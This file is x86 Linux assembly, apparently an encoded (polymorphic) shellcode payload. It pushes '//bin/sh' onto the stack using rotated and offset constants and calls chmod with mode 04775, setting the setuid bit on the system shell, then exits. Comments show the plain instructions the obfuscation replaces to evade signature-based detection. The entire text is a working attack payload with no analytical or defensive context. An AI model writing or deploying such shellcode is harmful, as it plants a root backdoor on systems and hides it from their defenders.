section .text
	global _start

_start: 

 xor    eax,eax
 xor    ebx,ebx
 xor    ecx,ecx
 push   ebx
; push   0x68732f6e
  mov ebx, 0xD0E65EDC
  ror ebx, 1
  push ebx

; push   0x69622f2f
 add ebx, 0xeeffc1
 push ebx

 mov    ebx,esp
; mov    cx,0x9fd
 mov cx, 0x13fa
 ror cx, 1

; mov    al,0xf
 mov al, 0x1e
 ror al, 1

 int    0x80

; mov    al,0x1
 add al, 0x1 

 int    0x80

